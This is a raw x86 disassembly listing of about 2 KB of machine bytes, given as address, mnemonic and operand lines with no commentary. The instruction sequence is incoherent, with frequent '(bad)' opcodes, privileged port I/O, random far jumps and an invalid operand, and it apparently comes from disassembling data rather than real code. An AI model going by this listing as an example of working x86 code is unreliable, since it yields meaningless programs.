  423cf1:	pop    ebp
  423cf2:	jecxz  0x423d19
  423cf4:	mov    ds:0xa5fdd66f,eax
  423cf9:	cld    
  423cfa:	mul    DWORD PTR [ebp-0x1523fa77]
  423d00:	inc    ebp
  423d01:	int    0xdb
  423d03:	inc    esp
  423d04:	push   0xfa311ef4
  423d09:	loopne 0x423cce
  423d0b:	dec    eax
  423d0c:	dec    esp
  423d0d:	int    0x2a
  423d0f:	div    eax
  423d11:	mov    dh,dl
  423d13:	outs   dx,BYTE PTR ds:[esi]
  423d14:	pop    ebx
  423d15:	test   al,0xf5
  423d17:	cld    
  423d18:	scas   al,BYTE PTR es:[edi]
  423d19:	fcmovb st,st(1)
  423d1b:	jbe    0x423d37
  423d1d:	push   ds
  423d1e:	iret   
  423d1f:	lock mov ebx,0x9bbb2c21
  423d25:	loopne 0x423d6d
  423d27:	pop    edx
  423d28:	in     al,0xa1
  423d2a:	in     al,0x12
  423d2c:	gs dec edi
  423d2e:	or     al,BYTE PTR [eax]
	...
  423d38:	add    BYTE PTR [eax],al
  423d3a:	clc    
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0x57ffb2
  423d47:	ja     0x423cd5
  423d49:	nop
  423d4a:	mov    edx,0xfd0001b6
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [ecx-0x481740db],ch
  423d57:	push   ebp
  423d58:	gs int 0x55
  423d5b:	les    ebp,FWORD PTR [edi+0x2f3575ad]
  423d61:	inc    esi
  423d62:	aas    
  423d63:	and    DWORD PTR [ebp+0x1a],edi
  423d66:	pushf  
  423d67:	mov    bl,0x97
  423d69:	xchg   ebp,eax
  423d6a:	mov    cl,0xc0
  423d6c:	retf   
  423d6d:	jge    0x423d87
  423d6f:	add    BYTE PTR cs:[edi+0x53],ah
  423d73:	sbb    al,0xf3
  423d75:	bound  edx,QWORD PTR [edx]
  423d77:	or     BYTE PTR [ebx],dh
  423d79:	inc    esp
  423d7a:	and    DWORD PTR [edx+edx*1-0x80],edx
  423d7e:	out    dx,eax
  423d7f:	enter  0x576,0x54
  423d83:	cdq    
  423d84:	shr    DWORD PTR [edi-0x5d],1
  423d87:	xor    al,0xab
  423d89:	push   edx
  423d8a:	pushf  
  423d8b:	pop    ds
  423d8c:	push   edx
  423d8d:	pop    esi
  423d8e:	(bad)
  423d91:	sub    DWORD PTR [edi+0x3a],0xf98d8a97
  423d98:	fwait
  423d99:	mov    al,ds:0xab1fa696
  423d9e:	dec    ebx
  423d9f:	xor    DWORD PTR [edx+0x74],edx
  423da2:	outs   dx,DWORD PTR ds:[esi]
  423da3:	dec    esp
  423da4:	aas    
  423da5:	pushf  
  423da6:	mov    esi,0x964b7eb7
  423dab:	sahf   
  423dac:	sti    
  423dad:	mov    WORD PTR [ebx],ds
  423daf:	fld    st(0)
  423db1:	inc    ecx
  423db2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  423db4:	out    dx,eax
  423db5:	test   eax,0x68b0eaf8
  423dba:	push   esp
  423dbb:	xchg   edi,eax
  423dbc:	arpl   WORD PTR [edi+0x714f7cf0],bp
  423dc2:	test   BYTE PTR [esi],0xcd
  423dc5:	lods   al,BYTE PTR ds:[esi]
  423dc6:	xor    dh,bl
  423dc8:	pop    ebx
  423dc9:	jbe    0x423df8
  423dcb:	add    eax,0xd3fceb1b
  423dd0:	pop    es
  423dd1:	and    al,0xa4
  423dd3:	fcomi  st,st(4)
  423dd5:	jge    0x423d88
  423dd7:	pop    ebp
  423dd8:	sbb    al,0x2c
  423dda:	iret   
  423ddb:	out    dx,eax
  423ddc:	shl    eax,cl
  423dde:	mov    edi,0xa990bb89
  423de3:	xor    ah,BYTE PTR [ebp-0x4d]
  423de6:	aad    0x2a
  423de8:	xor    BYTE PTR [ebx-0x4175a17f],bh
  423dee:	mov    eax,ds:0x118c5870
  423df3:	mul    BYTE PTR [esp+eax*2-0x688aa342]
  423dfa:	cmp    BYTE PTR [ebx+0x7cf5a306],al
  423e00:	sbb    al,BYTE PTR [ebx+0x3c]
  423e03:	mov    ch,0xfe
  423e05:	scas   eax,DWORD PTR es:[edi]
  423e06:	adc    al,0xe3
  423e08:	or     ch,BYTE PTR [eax-0x66f30932]
  423e0e:	jnp    0x423e48
  423e10:	push   cs
  423e11:	retf   
  423e12:	dec    ebx
  423e13:	hlt    
  423e14:	sbb    DWORD PTR [ecx],ecx
  423e16:	arpl   WORD PTR [ebx+0x14cebb79],si
  423e1c:	xor    BYTE PTR [edi],al
  423e1e:	(bad)  
  423e1f:	imul   ebp,DWORD PTR [ebx+edx*1-0x1e774621],0x14
  423e27:	aad    0x6d
  423e29:	imul   edx,DWORD PTR [eax],0xfe466948
  423e2f:	fst    DWORD PTR ds:0xd2672966
  423e35:	imul   esp,edx,0x42
  423e38:	inc    edi
  423e39:	fidivr DWORD PTR [esp+ebx*4-0x4c]
  423e3d:	repnz (bad) 
  423e3f:	jae    0x423e98
  423e41:	xchg   ebp,eax
  423e42:	cmc    
  423e43:	jae    0x423e3f
  423e45:	in     eax,dx
  423e46:	mov    cl,cl
  423e48:	mov    al,0x69
  423e4a:	add    eax,0x67ff4adf
  423e4f:	jb     0x423e72
  423e51:	mov    ds:0xb59e68c2,eax
  423e56:	shl    DWORD PTR [ebx+0x2f222550],1
  423e5c:	dec    eax
  423e5d:	or     ch,ah
  423e5f:	lock cld 
  423e61:	iret   
  423e62:	bound  edx,QWORD PTR [edx+0x4]
  423e65:	ret    0x931c
  423e68:	enter  0xdb6,0x96
  423e6c:	data16 loope 0x423df2
  423e6f:	adc    eax,0xc6439299
  423e74:	nop
  423e75:	popa   
  423e76:	test   eax,0x6430b142
  423e7b:	xchg   BYTE PTR [ecx+edi*2],bl
  423e7e:	test   eax,0xd03014f7
  423e83:	retf   
  423e84:	xor    BYTE PTR ds:0xb3f03fde,bl
  423e8a:	out    dx,eax
  423e8b:	aam    0x32
  423e8d:	sub    edx,ecx
  423e8f:	xchg   ebx,eax
  423e90:	adc    DWORD PTR [ebp+esi*1-0xf],0x23
  423e95:	js     0x423e22
  423e97:	sub    DWORD PTR [ecx+0x73],edi
  423e9a:	and    al,al
  423e9c:	iret   
  423e9d:	cmc    
  423e9e:	mov    al,bh
  423ea0:	les    ecx,FWORD PTR [ecx+0x5c]
  423ea3:	inc    ebp
  423ea4:	mov    cl,0xa0
  423ea6:	push   eax
  423ea7:	(bad)  
  423ea8:	daa    
  423ea9:	xchg   ecx,eax
  423eaa:	push   ebx
  423eab:	dec    ebx
  423eac:	push   ebx
  423ead:	sti    
  423eae:	test   DWORD PTR [ebx+0x6b3a1293],edx
  423eb4:	int    0x43
  423eb6:	xchg   edx,eax
  423eb7:	out    dx,al
  423eb8:	sub    al,0x27
  423eba:	test   bl,ch
  423ebc:	loopne 0x423f10
  423ebe:	jmp    0x176a4c0e
  423ec3:	hlt    
  423ec4:	imul   ebx,DWORD PTR [esi],0x33
  423ec7:	in     al,0xe9
  423ec9:	pop    edx
  423eca:	xor    esi,DWORD PTR [ebx]
  423ecc:	fs scas eax,DWORD PTR es:[edi]
  423ece:	inc    esp
  423ecf:	push   ebx
  423ed0:	xchg   BYTE PTR [ecx-0xd],cl
  423ed3:	cwde   
  423ed4:	sbb    ebx,DWORD PTR [edx+0x73]
  423ed7:	loope  0x423eae
  423ed9:	and    edx,0x634f4d5a
  423edf:	sbb    DWORD PTR [ecx+0x40c6bb62],esp
  423ee5:	fimul  DWORD PTR ss:[edi-0x71]
  423ee9:	cld    
  423eea:	jl     0x423f65
  423eec:	imul   edi,DWORD PTR [ebp-0x5c8d2eef],0x2
  423ef3:	inc    ebp
  423ef4:	jnp    0x423e7a
  423ef6:	add    cl,BYTE PTR [ebx]
  423ef8:	dec    ebp
  423ef9:	ins    DWORD PTR es:[edi],dx
  423efa:	mov    dl,0xf3
  423efc:	adc    BYTE PTR [edx],dh
  423efe:	aaa    
  423eff:	or     edx,DWORD PTR [ecx-0x11]
  423f02:	pop    ss
  423f03:	inc    esp
  423f04:	ror    DWORD PTR [eax-0x50b0b462],1
  423f0a:	cmp    eax,0xec691f26
  423f0f:	enter  0xa736,0xe
  423f13:	es jmp 0x423f8d
  423f16:	stc    
  423f17:	sub    al,BYTE PTR [esi-0x7e]
  423f1a:	add    ah,ch
  423f1c:	jns    0x423ec9
  423f1e:	mov    ebx,0x53243c36
  423f23:	jg     0x423f1c
  423f25:	int    0xad
  423f27:	ficomp DWORD PTR ds:0x538ec5ad
  423f2d:	inc    edx
  423f2e:	in     eax,0xb2
  423f30:	push   esp
  423f31:	or     ecx,DWORD PTR [ebx+0x75ac82a5]
  423f37:	mov    al,0xac
  423f39:	sti    
  423f3a:	pop    ecx
  423f3b:	jmp    0x79b4:0xf16393ac
  423f42:	sbb    BYTE PTR [eax+0x2c01663],dh
  423f48:	sub    edi,esi
  423f4a:	jl     0x423f1d
  423f4c:	sub    dl,BYTE PTR [ebx+eax*2]
	...
  423f57:	add    BYTE PTR [eax],al
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0xd5e902b9
  423f67:	xor    DWORD PTR [edx],0x1b8b7b1
  423f6d:	add    ch,bh
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [esi],ah
  423f73:	mov    dl,dl
  423f75:	fadd   st(1),st
  423f77:	inc    edx
  423f78:	int3   
  423f79:	jl     0x423fe4
  423f7b:	fld    QWORD PTR ds:0x71d06621
  423f81:	cmp    eax,0x5e3a0a05
  423f86:	adc    bl,dh
  423f88:	lahf   
  423f89:	in     al,0xeb
  423f8b:	stc    
  423f8c:	adc    dl,bl
  423f8e:	jns    0x423f77
  423f90:	sahf   
  423f91:	shr    DWORD PTR [esi],1
  423f93:	cwde   
  423f94:	push   ds
  423f95:	inc    ebp
  423f96:	xchg   esp,eax
  423f97:	sub    DWORD PTR ds:0xbdf98b45,0x7d
  423f9e:	ja     0x423f25
  423fa0:	sbb    BYTE PTR [eax-0x13],dh
  423fa3:	dec    esi
  423fa4:	rol    ebx,cl
  423fa6:	jnp    0x423f6a
  423fa8:	pop    edi
  423fa9:	sbb    DWORD PTR [ecx+0x4dd2aa4e],ebp
  423faf:	cdq    
  423fb0:	addr16 imul eax,DWORD PTR [bx+si],0xc93ae83f
  423fb8:	int3   
  423fb9:	push   ebx
  423fba:	cmp    BYTE PTR [edx-0x5d4918c],0x53
  423fc1:	aaa    
  423fc2:	in     al,0xa7
  423fc4:	mov    ah,0x49
  423fc6:	push   edx
  423fc7:	outs   dx,BYTE PTR ds:[esi]
  423fc8:	push   edx
  423fc9:	mov    esp,0x89b098ea
  423fce:	push   edi
  423fcf:	mov    bl,0xbb
  423fd1:	push   ebx
  423fd2:	ficomp WORD PTR [edx-0x25]
  423fd5:	jmp    0x424008
  423fd7:	jp     0x424023
  423fd9:	dec    eax
  423fda:	mov    eax,0x5ba092ee
  423fdf:	pop    ss
  423fe0:	or     DWORD PTR [eax+ebx*2-0x46],esi
  423fe4:	mov    BYTE PTR [edx-0x55],al
  423fe7:	inc    edi
  423fe8:	fadd   QWORD PTR [edi+0x6f]
  423feb:	sub    eax,0x6b721b4f
  423ff0:	jne    0x423fe4
  423ff2:	mov    ebp,0x45eb0d4
  423ff7:	in     al,0x90
  423ff9:	out    dx,eax
  423ffa:	icebp  
  423ffb:	fisttp QWORD PTR [ecx+edx*4+0xd]
  423fff:	xor    al,0xac
  424001:	rcr    DWORD PTR [ebx+0x1230ca81],0x52
  424008:	inc    edi
  424009:	jbe    0x42401a
  42400b:	pop    eax
  42400c:	es xchg ebp,eax
  42400e:	mov    edi,0xb928260
  424013:	push   es
  424014:	sub    eax,0x6411674a
  424019:	xchg   ebp,eax
  42401a:	mov    bh,0xd2
  42401c:	jno    0x424012
  42401e:	fld    QWORD PTR [ebp-0x14]
  424021:	(bad)  
  424022:	adc    eax,0x5f887af
  424027:	ja     0x424073
  424029:	fs sahf 
  42402b:	pop    ss
  42402c:	ret    
  42402d:	add    bl,BYTE PTR [ebp+0xa]
  424030:	jp     0x423fe6
  424032:	(bad)  
  424033:	xchg   ebp,eax
  424034:	push   edi
  424035:	popa   
  424036:	ror    BYTE PTR [ecx-0x20b90449],cl
  42403c:	pop    ecx
  42403d:	mov    ds:0xa2cc5e34,al
  424042:	and    eax,0x99deca33
  424047:	push   edi
  424048:	in     eax,dx
  424049:	pushf  
  42404a:	inc    ecx
  42404b:	gs jno 0x424073
  42404e:	or     cl,BYTE PTR [ecx-0x4c]
  424051:	xchg   ebp,eax
  424052:	sbb    al,BYTE PTR [eax+0x9]
  424055:	stos   DWORD PTR es:[edi],eax
  424056:	xchg   edx,eax
  424057:	lods   al,BYTE PTR ds:[esi]
  424058:	and    BYTE PTR [ecx-0x2ec74534],cl
  42405e:	adc    al,0x3a
  424060:	pop    edx
  424061:	in     eax,dx
  424062:	pop    ebp
  424063:	adc    eax,0x7a9cdc65
  424068:	and    al,0x1f
  42406a:	add    ebx,DWORD PTR [ebx+eiz*8-0x28d47d5a]
  424071:	jbe    0x42408b
  424073:	dec    ebx
  424074:	xchg   esi,eax
  424075:	(bad)  
  424076:	test   DWORD PTR [ecx+0x1f],0xd0ff8f4c
  42407d:	aaa    
  42407e:	cmp    DWORD PTR [ecx+0x4e],edi
  424081:	cmp    edi,esp
  424083:	xchg   ebx,eax
  424084:	repz adc DWORD PTR [esi],eax
  424087:	gs push ss
  424089:	call   0x79c6412c
  42408e:	push   0xffffffc2
  424090:	bound  ebp,QWORD PTR ds:0x58d7d74
  424096:	xor    DWORD PTR cs:[edx+0x68bb8cd2],ebp
  42409d:	jmp    0x892282f6
  4240a2:	repz cwde 
  4240a4:	cmp    al,0x32
  4240a6:	arpl   di,cx
  4240a8:	sub    BYTE PTR [ebp-0x17],0x5
  4240ac:	test   BYTE PTR [ecx+0x5ed77a6a],bh
  4240b2:	outs   dx,DWORD PTR ds:[esi]
  4240b3:	stos   DWORD PTR es:[edi],eax
  4240b4:	and    eax,0xf3d01632
  4240b9:	add    BYTE PTR [edx+0x411de45],bl
  4240bf:	or     ecx,DWORD PTR [ebp+eax*8-0x48]
  4240c3:	jo     0x42406b
  4240c5:	call   ebx
  4240c7:	inc    ebp
  4240c8:	ins    BYTE PTR es:[edi],dx
  4240c9:	mov    dh,BYTE PTR [eax+eax*1]
  4240cc:	jae    0x4240b6
  4240ce:	cdq    
  4240cf:	inc    edi
  4240d0:	dec    ebp
  4240d1:	test   al,0x97
  4240d3:	adc    DWORD PTR [edi+0x78],ebx
  4240d6:	lods   al,BYTE PTR ds:[esi]
  4240d7:	not    cl
  4240d9:	sub    BYTE PTR [ebx+ebx*2+0x67],0x11
  4240de:	inc    ebx
  4240df:	(bad)  
  4240e1:	sub    BYTE PTR [eax-0x5f1da2bf],dl
  4240e7:	xor    DWORD PTR [edx+0x19c419d9],eax
  4240ed:	into   
  4240ee:	add    eax,0x479beed4
  4240f3:	jl     0x4240a3
  4240f5:	mov    cl,0x66
  4240f7:	pop    ebp
  4240f8:	shl    esp,0xf
  4240fb:	fstp   st(4)
  4240fd:	xchg   BYTE PTR [eax],cl
  4240ff:	mov    dh,0x2f
  424101:	ret    0x14da
  424104:	daa    
  424105:	or     al,0x61
  424107:	popa   
  424108:	and    al,0xe2
  42410a:	and    ecx,0xb35d4984
  424110:	xchg   ebp,eax
  424111:	add    eax,0x5f18fb91
  424116:	xor    al,0x59
  424118:	inc    ebp
  424119:	pusha  
  42411a:	xchg   BYTE PTR [edx-0x69],bl
  42411d:	repz add edi,edi
  424120:	push   ds
  424121:	sub    DWORD PTR [esi+0x7d],ebx
  424124:	pop    esi
  424125:	xor    DWORD PTR [edi-0x1784e6ff],esi
  42412b:	inc    edi
  42412c:	push   edx
  42412d:	and    bh,bl
  42412f:	sahf   
  424130:	sbb    al,0xcd
  424132:	cmp    DWORD PTR [esi-0x1a85d270],ebx
  424138:	retf   0xb408
  42413b:	mov    edi,0x30dd533f
  424140:	mov    ebx,0xc6af2e8b
  424145:	in     al,dx
  424146:	adc    edi,0xffffffe4
  424149:	imul   esi,DWORD PTR [ebp-0x46],0xfffffff1
  42414d:	outs   dx,DWORD PTR ds:[esi]
  42414e:	mov    dl,0x4b
  424150:	lahf   
  424151:	xor    eax,0x8a3a977f
  424156:	pushf  
  424157:	push   ds
  424158:	into   
  424159:	mov    esi,0x1114c2aa
  42415e:	push   0xeff6ec2c
  424163:	mov    ebp,0x32d693c4
  424168:	pusha  
  424169:	or     DWORD PTR [ebx+edx*4+0x5c],ecx
  42416d:	(bad)  
  42416e:	lock add BYTE PTR [eax],al
	...
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	fbld   TBYTE PTR [esi-0x1b]
  424189:	xchg   edx,eax
  42418a:	mov    ah,0xba
  42418c:	add    DWORD PTR [eax],eax
  42418e:	std    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [edx+0x25],ah
  424194:	sti    
  424195:	add    al,0x26
  424197:	scas   eax,DWORD PTR es:[edi]
  424198:	mov    al,0x42
  42419a:	in     al,0x73
  42419c:	xchg   ebx,eax
  42419d:	cmp    al,0x32
  42419f:	add    bh,BYTE PTR [eax+0x29b94aa9]
  4241a5:	adc    BYTE PTR [esi+ebp*1],bl
  4241a8:	push   es
  4241a9:	add    al,0x77
  4241ab:	mov    bh,0xb8
  4241ad:	jge    0x4241c0
  4241af:	mov    bl,BYTE PTR [ecx+0x794d4a20]
  4241b5:	dec    esi
  4241b6:	cli    
  4241b7:	inc    esi
  4241b8:	ror    dl,1
  4241ba:	in     eax,0x65
  4241bc:	adc    eax,0x3938a927
  4241c1:	arpl   WORD PTR [edi+0x724593a1],dx
  4241c7:	test   eax,0x42f7d73b
  4241cc:	inc    edi
  4241cd:	and    DWORD PTR [ebx-0x56eab30c],eax
  4241d3:	mov    ah,BYTE PTR [ecx]
  4241d5:	push   ecx
  4241d6:	leave  
  4241d7:	jmp    0x7263:0x53467601
  4241de:	cwde   
  4241df:	call   0x94b0:0xad715bac
  4241e6:	cld    
  4241e7:	(bad)  [edi-0x30]
  4241ea:	sbb    bl,bh
  4241ec:	push   esi
  4241ed:	sub    DWORD PTR [esi+0x5],esi
  4241f0:	retf   
  4241f1:	or     dh,0x14
  4241f4:	add    DWORD PTR [esi-0x44678804],0xffffffb6
  4241fb:	(bad)  
  4241fd:	fidiv  WORD PTR [ecx]
  4241ff:	cmp    al,0x9d
  424201:	sti    
  424202:	scas   eax,DWORD PTR es:[edi]
  424203:	and    BYTE PTR [eax-0x20],dh
  424206:	mov    dh,0xc5
  424208:	(bad)  
  424209:	pop    DWORD PTR [esi-0x40bb91c8]
  42420f:	aam    0x17
  424211:	retf   0xf65b
  424214:	das    
  424215:	xor    esp,DWORD PTR [edi-0x5a8fb15c]
  42421b:	or     eax,0x9b2f1111
  424220:	ror    BYTE PTR [edx],cl
  424222:	jmp    0xfc5c:0x6f71fd72
  424229:	loopne 0x4242a2
  42422b:	adc    DWORD PTR [eax],ebx
  42422d:	jo     0x424205
  42422f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424230:	inc    eax
  424231:	out    0x14,eax
  424233:	inc    edi
  424234:	rol    DWORD PTR [ebx],1
  424236:	repnz outs dx,BYTE PTR ds:[esi]
  424238:	jmp    0x876d8e50
  42423d:	sbb    al,0x95
  42423f:	xchg   DWORD PTR [eax+eax*2-0xf6c9134],ecx
  424246:	or     BYTE PTR [edi+0x21],dh
  424249:	fs push edi
  42424b:	retf   0x18ce
  42424e:	adc    DWORD PTR [esi],edi
  424250:	dec    ecx
  424251:	cmp    DWORD PTR [edi],esi
  424253:	nop
  424254:	pop    edx
  424255:	mov    BYTE PTR [esi+0x2],ch
  424258:	adc    BYTE PTR [ebp+0x5c97d70a],al
  42425e:	(bad)  
  424260:	lock loope 0x42428d
  424263:	gs xor eax,0x547f5ca7
  424269:	fisttp QWORD PTR [ebp-0x2d]
  42426c:	cmp    DWORD PTR [edi],ebp
  42426e:	mov    dh,0x7f
  424270:	shl    cl,0xfe
  424273:	xor    eax,0xdab1417f
  424278:	sub    eax,esi
  42427a:	sbb    bh,BYTE PTR [edi-0x66]
  42427d:	std    
  42427e:	xor    DWORD PTR [esi],edx
  424280:	push   ecx
  424281:	stos   BYTE PTR es:[edi],al
  424282:	test   al,0x86
  424284:	xor    esi,esp
  424286:	scas   eax,DWORD PTR es:[edi]
  424287:	jne    0x424236
  424289:	add    al,0x3
  42428b:	sub    BYTE PTR [esi],cl
  42428d:	nop
  42428e:	sbb    eax,0x68f06a61
  424293:	sub    edi,DWORD PTR [edx]
  424295:	dec    ebx
  424296:	test   eax,0xf609d25d
  42429b:	mov    eax,ds:0x3c5cbc55
  4242a0:	push   esp
  4242a1:	mov    ?,WORD PTR [ebx]
  4242a3:	pusha  
  4242a4:	(bad)  
  4242a5:	ins    BYTE PTR es:[edi],dx
  4242a6:	loope  0x42428f
  4242a8:	scas   al,BYTE PTR es:[edi]
  4242a9:	xor    al,0xa2
  4242ab:	add    esp,esp
  4242ad:	popf   
  4242ae:	sbb    eax,0xe3e511df
  4242b3:	sar    DWORD PTR [ecx],0xd2
  4242b6:	mov    DWORD PTR [ecx],ebx
  4242b8:	out    dx,eax
  4242b9:	(bad)  
  4242bb:	adc    BYTE PTR [edi],ah
  4242bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242be:	and    al,0xf5
  4242c0:	sbb    BYTE PTR [edi+0x67507417],ah
  4242c6:	add    bh,BYTE PTR [ebp-0x4ddcddb1]
  4242cc:	sub    BYTE PTR [eax+0x6ab17423],ch
  4242d2:	fsub   QWORD PTR [ebx]
  4242d4:	pushf  
  4242d5:	mov    ebx,0xa24825ec
  4242da:	pusha  
  4242db:	test   DWORD PTR [eax+ebp*8-0x2b89423c],ecx
  4242e2:	enter  0x268f,0x8f
  4242e6:	daa    
  4242e7:	jmp    0x424313
  4242e9:	scas   al,BYTE PTR es:[edi]
  4242ea:	jno    0x424275
  4242ec:	fs ret 0xf757
  4242f0:	pop    esi
  4242f1:	and    esp,DWORD PTR [edi+0x52]
  4242f4:	add    BYTE PTR [eax+0x6c],0xaa
  4242f8:	mov    ds:0x4a8a26af,al
  4242fd:	or     ah,BYTE PTR [ebx+0x5076c902]
  424303:	inc    eax
  424304:	sub    bl,BYTE PTR [ebx]
  424306:	sub    BYTE PTR [ebp-0x6c1976a8],0x36
  42430d:	or     DWORD PTR [edx],eax
  42430f:	retf   
  424310:	or     al,0xa2
  424312:	mov    dl,0x89
  424314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424315:	adc    esp,esp
  424317:	sub    cl,BYTE PTR [edi+0x790f2e3f]
  42431d:	ins    BYTE PTR es:[edi],dx
  42431e:	enter  0x9c90,0x57
  424322:	jns    0x42430a
  424324:	icebp  
  424325:	(bad)  
  424326:	cmp    al,0x9b
  424328:	daa    
  424329:	pop    eax
  42432a:	and    eax,DWORD PTR [ebp-0x17930987]
  424330:	add    ch,BYTE PTR [edi-0x3f]
  424333:	fmul   DWORD PTR [ebx-0x3371a2fc]
  424339:	mov    al,ds:0x54e70dc6
  42433e:	lods   al,BYTE PTR ds:[esi]
  42433f:	or     al,0x82
  424341:	in     eax,dx
  424342:	jmp    DWORD PTR [edx]
  424344:	pop    ebp
  424345:	ins    DWORD PTR es:[edi],dx
  424346:	cli    
  424347:	test   DWORD PTR [eax],esp
  424349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42434a:	and    eax,DWORD PTR [esi-0x3ac7110f]
  424350:	repz gs mov ebx,0x1ea95074
  424357:	xor    bl,BYTE PTR [ebp+0x2a]
  42435a:	jle    0x4243d4
  42435c:	add    ch,0x53
  42435f:	test   ebp,ebp
  424361:	gs aas 
  424363:	mov    edx,0x7fe04273
  424368:	(bad)  
  42436a:	jg     0x42439f
  42436c:	outs   dx,DWORD PTR ds:[esi]
  42436d:	enter  0x4729,0x19
  424371:	xlat   BYTE PTR ds:[ebx]
  424372:	(bad)  
  424373:	neg    DWORD PTR [eax-0x62]
  424376:	cmp    BYTE PTR [esi-0xbb0cf84],ch
  42437c:	inc    ecx
  42437d:	sti    
  42437e:	jmp    0x949dceec
  424383:	lds    ebx,FWORD PTR [esi]
  424385:	stc    
  424386:	xlat   BYTE PTR ds:[ebx]
  424387:	fdivrp st(0),st
  424389:	pop    ds
  42438a:	jo     0x4243ce
  42438c:	cs inc ebp
  42438e:	arpl   WORD PTR [eax],ax
	...
  424398:	add    BYTE PTR [eax],al
  42439a:	adc    bl,al
  42439c:	arpl   WORD PTR [edx-0x15],si
  42439f:	sti    
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	inc    edx
  4243a7:	test   BYTE PTR [edx],bl
  4243a9:	xor    dh,BYTE PTR [ecx-0x2fffe44]
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    BYTE PTR [esi],ch
  4243b3:	jno    0x42433d
  4243b5:	cmp    BYTE PTR [eax-0x377b5a22],0x83
  4243bc:	pop    esp
  4243bd:	(bad)  
  4243be:	pop    eax
  4243bf:	add    cl,ch
  4243c1:	jmp    0x2cc3:0xd027e44d
  4243c8:	push   esi
  4243c9:	ss dec eax
  4243cb:	mov    ecx,0x4b732746
  4243d0:	(bad)  
  4243d1:	push   ebp
  4243d2:	fisttp WORD PTR [ebx]
  4243d4:	jmp    0x208:0xdd75aa86
  4243db:	jle    0x424429
  4243dd:	jp     0x424416
  4243df:	jno    0x424403
  4243e1:	cmp    DWORD PTR [eax+ecx*8-0x6e0b6e09],ebp
  4243e8:	int    0x18
  4243ea:	sbb    DWORD PTR [ebx+0x2a],esi
  4243ed:	sbb    eax,ebx
  4243ef:	adc    BYTE PTR [edi],0xbf
  4243f2:	(bad)  
  4243f3:	sti    
  4243f4:	adc    al,0x94
  4243f6:	add    dh,al
  4243f8:	std    
  4243f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243fa:	in     eax,0x9
  4243fc:	sbb    edx,DWORD PTR [ecx-0x16]
  4243ff:	out    dx,eax
  424400:	out    dx,eax
  424401:	das    
  424402:	xlat   BYTE PTR ds:[ebx]
  424403:	rcr    BYTE PTR [ebx-0x14],cl
  424406:	xchg   DWORD PTR [edi+0x63],eax
  424409:	faddp  st(2),st
  42440b:	sbb    eax,0xe3663d8e
  424410:	lahf   
  424411:	fdivr  QWORD PTR [edi+edx*1-0x77]
  424415:	add    bl,BYTE PTR [ebx-0x53]
  424418:	fnsave [esi-0x35aa6a1e]
  42441e:	(bad)  
  42441f:	addr16 ja 0x4243ab
  424422:	sbb    ebx,esi
  424424:	cmp    DWORD PTR [edi+0x43],ebp
  424427:	cmp    ah,bh
  424429:	imul   ebp,edx,0x695e0c4f
  42442f:	adc    ch,BYTE PTR [ecx-0x79c8edf1]
  424435:	or     al,BYTE PTR [ebp-0x15]
  424438:	lea    ebp,[esi+0x68]
  42443b:	imul   ecx,DWORD PTR [ebp+0x4e65b1c4],0x6c20d360
  424445:	xchg   dl,dl
  424447:	and    eax,0x658e4e94
  42444c:	retf   0x9e98
  42444f:	icebp  
  424450:	and    BYTE PTR [eax+0x67],dh
  424453:	pop    ebx
  424454:	sub    BYTE PTR [ebx],bl
  424456:	and    eax,0xc231d084
  42445b:	dec    ecx
  42445c:	add    DWORD PTR [edi+0x5a8a2077],ecx
  424462:	ficomp WORD PTR [ecx+0x7c6852ee]
  424468:	mov    cl,0xfc
  42446a:	mov    edi,0x6b814e5e
  42446f:	test   eax,0xf400da26
  424474:	push   0xfffffff3
  424476:	sbb    bl,BYTE PTR ds:0xbd22adc6
  42447c:	je     0x424420
  42447e:	mov    ecx,DWORD PTR [ebx]
  424480:	je     0x42445e
  424482:	push   ebx
  424483:	xchg   edx,eax
  424484:	pushf  
  424485:	loope  0x4244b3
  424487:	xor    eax,0xcc9a3c70
  42448c:	mov    ds:0x86602815,al
  424491:	sbb    BYTE PTR [ebx-0x40],ah
  424494:	shl    DWORD PTR [ebx+0x10],1
  424497:	xor    eax,0x37f57e3f
  42449c:	add    DWORD PTR [ecx-0x57004489],0x1711d2fb
  4244a6:	fadd   DWORD PTR [ebp-0x5b]
  4244a9:	(bad)  
  4244ab:	sbb    DWORD PTR [ebx-0x3],esi
  4244ae:	jbe    0x4244bc
  4244b0:	dec    ebx
  4244b1:	mov    dl,0x14
  4244b3:	mov    BYTE PTR [ebx-0x5a],0xf6
  4244b7:	fcomp  st(0)
  4244b9:	cmp    BYTE PTR [edx+0x46e5a88a],cl
  4244bf:	sbb    edi,ebx
  4244c1:	xor    BYTE PTR [edi+edi*2+0x68d7224],ch
  4244c8:	mov    bh,0x24
  4244ca:	inc    ecx
  4244cb:	push   edi
  4244cc:	fisttp DWORD PTR [esi-0x4a12b2fd]
  4244d2:	aad    0x44
  4244d4:	arpl   di,bp
  4244d6:	loopne 0x42453b
  4244d8:	addr16 jg 0x42452a
  4244db:	inc    si
  4244dd:	hlt    
  4244de:	inc    edx
  4244df:	mov    WORD PTR [ebx+0x45],ss
  4244e2:	push   eax
  4244e3:	sub    DWORD PTR [ebx-0x5c],0x24
  4244e7:	xchg   ecx,eax
  4244e8:	aam    0x2c
  4244ea:	inc    ecx
  4244eb:	or     dh,BYTE PTR [edi]
  4244ed:	jg     0x424482
  4244ef:	mov    al,ds:0xf18df353
